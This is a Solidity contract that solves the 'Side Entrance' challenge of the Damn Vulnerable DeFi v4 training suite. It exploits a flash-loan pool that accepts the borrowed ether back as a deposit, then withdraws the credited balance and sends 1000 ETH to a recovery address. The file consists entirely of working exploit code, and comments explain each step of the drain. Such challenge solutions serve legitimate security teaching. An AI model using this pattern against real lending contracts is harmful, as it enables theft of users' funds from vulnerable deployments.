// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {

    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external payable {
        pool.flashLoan(ETHER_IN_POOL); // flow goes to execute that gives back the money
        pool.withdraw(); // but now we can withdraw it
        payable(recovery).transfer(ETHER_IN_POOL); // now we can send it to recovery address
    }

    function execute() external payable{
        pool.deposit{value: ETHER_IN_POOL}();
    }

    receive() external payable {}
}